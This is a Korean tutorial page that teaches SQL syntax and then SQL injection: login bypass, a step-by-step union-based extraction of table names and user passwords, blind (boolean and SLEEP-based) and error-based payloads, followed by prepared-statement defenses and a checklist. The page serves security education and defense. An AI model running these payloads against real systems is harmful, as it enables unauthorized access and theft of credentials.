SQL 문법부터 SQL Injection까지
한 번에 정리하기

관계형 DB의 기본 문법(DML/DDL)과 서브쿼리·UNION 같은 SQL의 고급 기능을 익히고, 그 지식이 어떻게 Union-based / Blind / Error-based SQL Injection 공격으로 이어지는지, 그리고 실무에서 어떻게 막는지까지 한 페이지로 정리했습니다.

SELECT / INSERT / UPDATE / DELETE Subquery & UNION Union-based Blind SQLi Error-based Prepared Statement

01 조회 — SELECT 문법

SQL Injection의 90% 이상은 SELECT 문에서 발생합니다. 가장 먼저 완벽하게 손에 익혀야 할 문법입니다.

SELECT column1, column2
FROM table_name
WHERE condition
GROUP BY column1
HAVING group_condition
ORDER BY column1 DESC
LIMIT 10 OFFSET 0;

실행 순서 (논리적 처리 순서)

SQL은 작성 순서와 실제 실행(평가) 순서가 다릅니다. 이걸 알아야 인젝션 페이로드가 어디서 평가되는지 이해할 수 있습니다.

1. FROM / JOIN

대상 테이블을 결정하고 조인을 수행합니다.

2. WHERE

행 단위 필터링. 로그인 인증 우회(OR 1=1)가 발생하는 지점입니다.

3. GROUP BY / HAVING

그룹화 및 그룹 단위 필터링.

4. SELECT (컬럼 평가)

출력할 컬럼/표현식을 계산합니다. UNION SELECT의 결과가 합쳐지는 지점입니다.

5. ORDER BY / LIMIT

정렬·페이징. UNION 컬럼 개수 추정에 ORDER BY가 자주 쓰입니다.

주요 연산자 / 조건식

구문설명예시
=, !=, <>, >, <비교 연산자WHERE id = 1
AND / OR논리 결합 — 인젝션의 핵심 도구WHERE id=1 OR 1=1
LIKE패턴 매칭 (%, _)WHERE name LIKE 'kim%'
IN (...)여러 값 중 일치WHERE id IN (1,2,3)
BETWEEN범위 조건WHERE age BETWEEN 20 AND 30
IS NULLNULL 여부 (= NULL 불가)WHERE pw IS NULL
--, #, /* */주석 — 뒤따르는 쿼리 무력화에 사용' OR 1=1 --
Tip MySQL에서 한 줄 주석 -- 뒤에는 반드시 공백이 하나 와야 합니다(-- ). 공백이 없으면 주석으로 인식되지 않아 페이로드가 실패하는 경우가 흔합니다.

02 데이터 조작 — INSERT / UPDATE / DELETE

INSERT 생성

INSERT INTO users (id, pw)
VALUES ('admin', '1234');

회원가입 폼에 삽입되면 두 번째 INSERT 문 추가, 컬럼 수 불일치 에러 유발 등에 활용됩니다.

UPDATE 수정

UPDATE users
SET pw='new'
WHERE id='kim';

WHERE 절이 인젝션으로 무력화되면 전체 테이블이 일괄 수정되는 치명적 사고로 이어집니다.

DELETE 삭제

DELETE FROM logs
WHERE id=1;

WHERE 우회 시 전체 행 삭제. DML 중 가장 파급력이 큽니다.

03 데이터 정의 — DDL

대부분의 SQLi는 DML(SELECT 등)에서 발생하지만, 스택 쿼리(Stacked Queries)가 가능한 환경에서는 DDL까지 실행될 수 있어 함께 알아둡니다.

CREATE TABLE users (
  id    INT PRIMARY KEY AUTO_INCREMENT,
  uid   VARCHAR(32)  NOT NULL,
  pw    VARCHAR(64)  NOT NULL,
  email VARCHAR(64)  UNIQUE
);

ALTER TABLE users ADD COLUMN is_admin BOOLEAN DEFAULT 0;
DROP TABLE logs;
TRUNCATE TABLE session_tmp;
Warning mysqli_query()나 PDO의 execute() 등 일부 드라이버는 기본적으로 한 번에 한 문장만 실행되지만, 일부 환경/드라이버 설정(예: 멀티 쿼리 활성화)에서는 세미콜론(;)으로 구분된 Stacked Query가 그대로 실행되어 DROP TABLE까지 가능해질 수 있습니다.

04 고급 기능 — Subquery / UNION / 함수

서브쿼리 (Subquery)

SELECT uid FROM users
WHERE id = (
  SELECT id FROM users WHERE uid='admin'
);

괄호 안의 쿼리가 먼저 평가되어 결과를 바깥 쿼리에 전달합니다. 인젝션에서는 (SELECT password FROM users LIMIT 1) 형태로 다른 컬럼/테이블의 값을 조건식 안으로 끌어오는 통로로 사용됩니다.

UNION — 결과 집합 합치기

SELECT name, email FROM users
UNION
SELECT title, content FROM posts;
조건설명
컬럼 개수 일치두 SELECT의 컬럼 개수가 같아야 함
데이터 타입 호환같은 위치의 컬럼 타입이 호환되어야 함 (문자열은 보통 어디든 들어감)
UNION vs UNION ALL전자는 중복 제거(정렬 비용 발생), 후자는 중복 허용(더 빠름)

자주 쓰이는 정보수집용 함수

함수DBMS용도
version() / @@versionMySQL/MSSQLDB 버전 확인
database() / schema()MySQL현재 DB명 확인
group_concat(col)MySQL여러 행을 한 줄로 결합 → 결과 출력 칸이 1개뿐일 때 유용
information_schema.tables/columns표준테이블/컬럼명 목록 조회

Tip information_schema는 DBMS 메타데이터를 담은 "DB의 지도"입니다. 테이블/컬럼명을 모를 때 가장 먼저 조회하는 대상입니다. 
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT column_name FROM information_schema.columns WHERE table_name='users';

05 SQL Injection 원리

핵심은 한 가지입니다: 사용자 입력이 문자열 조립을 통해 SQL 구문의 일부로 "탈출"하는 것.

// 서버 코드 (의사 코드)
query = "SELECT * FROM users WHERE id='" + input + "' AND pw='" + pw + "'";

// 정상 입력: id=kim, pw=1234
SELECT * FROM users WHERE id='kim' AND pw='1234'

// 공격 입력: id = admin'-- 
SELECT * FROM users WHERE id='admin'-- ' AND pw='anything'
// → '--' 뒤가 모두 주석 처리되어 비밀번호 검증 없이 admin으로 로그인

가장 유명한 우회 패턴은 WHERE 절을 항상 참(True)으로 만드는 것입니다.

SELECT * FROM users WHERE id='' OR '1'='1' AND pw='' OR '1'='1'

06 공격 유형 한눈에 보기

유형전제 조건핵심 아이디어
In-band / Union-based쿼리 결과가 화면에 그대로 출력됨UNION SELECT로 원하는 데이터를 결과 화면에 직접 끼워 넣음
Error-basedDB 에러 메시지가 화면에 노출됨강제로 에러를 유발하고, 에러 메시지 안에 원하는 데이터를 실어 보냄
Blind (Boolean-based)결과/에러 노출 없이 화면 분기(참/거짓)만 다름참/거짓 조건을 반복해 한 글자씩(or 한 비트씩) 데이터 추출
Blind (Time-based)화면 차이도 없을 때SLEEP()으로 응답 지연 여부를 참/거짓 신호로 사용

07 Union-based SQL Injection

1. 인젝션 포인트 확인

입력값에 따옴표/괄호 등을 넣어 에러나 화면 변화가 생기는지 확인.

id=1'

2. 원본 쿼리의 컬럼 개수 파악

ORDER BY n을 점점 늘려서 에러가 나는 시점의 직전 숫자가 컬럼 개수.

id=1 ORDER BY 1
id=1 ORDER BY 2
id=1 ORDER BY 3 -- 여기서 에러 → 컬럼 2개

3. 출력되는 컬럼 위치 파악

화면에 실제로 값이 보이는 컬럼 자리를 찾아, 그 자리에 원하는 값을 끼워 넣을 준비.

id=-1 UNION SELECT 1,2

4. 원하는 데이터로 교체

출력 위치에 테이블명·컬럼명·실제 데이터를 순서대로 삽입.

id=-1 UNION SELECT table_name,2 FROM information_schema.tables
id=-1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'
id=-1 UNION SELECT uid,pw FROM users
Tip 원래 쿼리가 결과를 1건만 반환하도록 되어 있다면 id=-1처럼 절대 존재하지 않는 값을 넣어 원본 결과는 비우고, UNION으로 가져온 데이터만 화면에 노출시키는 것이 정석입니다.

08 Blind SQL Injection

결과 값이나 에러를 직접 볼 수 없을 때, "참/거짓" 또는 "응답 시간"이라는 1비트의 신호만으로 데이터를 추출하는 기법입니다. 느리지만 자동화하면 강력합니다.

Boolean-based

// 현재 DB 사용자의 첫 글자가 'a'인지 확인
id=1 AND SUBSTRING((SELECT current_user()),1,1)='a'
// 참이면 정상 페이지, 거짓이면 다른 페이지/빈 화면 → 알파벳을 하나씩 바꿔가며 이진탐색

Time-based

// 참일 때만 5초 지연 → 응답 시간으로 참/거짓 판별
id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)
Warning Time-based는 한 글자를 알아내는 데 (알파벳 수 ÷ 2) × 지연시간 만큼 걸릴 수 있어 매우 느립니다. 실무 진단에서는 보통 sqlmap 같은 도구로 자동화하지만, 학습 목적에선 직접 스크립트(Python requests + 이진탐색)를 짜보는 것이 이해에 큰 도움이 됩니다.

09 Error-based SQL Injection

DB가 에러 메시지를 그대로 클라이언트에 보여줄 때, 그 메시지 안에 원하는 데이터를 강제로 끼워 넣는 방식입니다.

// MySQL — extractvalue 활용 (XPath 구문 오류를 유발)
id=1 AND extractvalue(1, concat(0x7e, (SELECT database())))
// 에러 메시지: XPATH syntax error: '~mydatabase' → DB명이 그대로 노출됨

최신 MySQL 버전(8.0.21+)에서는 extractvalue/updatexml 같은 일부 함수가 제거된 경우가 있어, 실습 시 사용 중인 DBMS 버전을 꼭 확인해야 합니다.

10 실무 방어 기법

1순위 — Prepared Statement (가장 확실한 방법)

취약

문자열 결합 방식

// PHP
$query = "SELECT * FROM users WHERE id='$id'";
$result = mysqli_query($conn, $query);

입력값이 쿼리 구조에 직접 섞여 들어가 인젝션에 100% 노출됩니다.

안전

Prepared Statement

// PHP / mysqli
$stmt = $conn->prepare("SELECT * FROM users WHERE id=?");
$stmt->bind_param("s", $id);
$stmt->execute();

입력값이 "데이터"로만 바인딩되어 쿼리 구조를 절대 바꿀 수 없습니다.

# Python / PyMySQL
cursor.execute("SELECT * FROM users WHERE id=%s AND pw=%s", (id, pw))

-- Java / JDBC
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id=?");
stmt.setString(1, id);

그 외 다층 방어 (Defense in Depth)

입력값 검증

화이트리스트 기반 검증(숫자만/지정 패턴만 허용). 블랙리스트(특정 키워드 차단)는 우회가 쉬워 보조 수단일 뿐, 1차 방어로 쓰면 안 됩니다.

최소 권한 계정

웹앱 DB 계정에는 필요한 테이블에 대한 SELECT/INSERT 등 최소 권한만 부여. information_schema 접근, DROP/FILE 권한 등은 제거.

ORM 사용

SQLAlchemy, Hibernate, Sequelize 등 ORM은 내부적으로 파라미터 바인딩을 사용해 안전하지만, raw query / 문자열 포맷팅 메서드는 여전히 위험합니다.

에러 메시지 숨김

운영 환경에서 DB 에러를 사용자에게 그대로 노출하지 않음 → Error-based 공격 표면 축소.

WAF

알려진 패턴을 1차로 차단하는 보조 장치. 우회 가능성이 있어 근본 대책(Prepared Statement)을 대체할 수 없습니다.

로깅 & 모니터링

UNION, information_schema, SLEEP 등 비정상 패턴이 포함된 쿼리/요청을 탐지·경보.

자주 하는 실수 mysqli_real_escape_string()이나 addslashes()로 따옴표만 이스케이프하는 것은 1990년대식 방어이며 완전하지 않습니다(예: 숫자형 컬럼, 인코딩 문제로 우회 가능). 이스케이프 처리는 Prepared Statement의 대체재가 아니라 보조 수단일 뿐입니다.

11 점검 체크리스트

  • 모든 DB 쿼리가 Prepared Statement / 파라미터 바인딩을 사용하는가?
  • 동적으로 테이블명·컬럼명을 받아야 하는 경우, 화이트리스트로 검증했는가? (바인딩 불가능한 부분)
  • 운영 환경에서 DB 에러 메시지가 사용자에게 노출되지 않는가?
  • 애플리케이션 DB 계정의 권한이 필요한 범위로 최소화되어 있는가?
  • ORM 사용 시 raw query / 문자열 결합 메서드를 쓰지 않았는가?
  • 입력값에 대해 길이·형식·타입 기준의 화이트리스트 검증을 적용했는가?
  • 로그인/검색 등 사용자 입력이 들어가는 모든 엔드포인트를 인젝션 관점에서 한 번씩 테스트했는가?
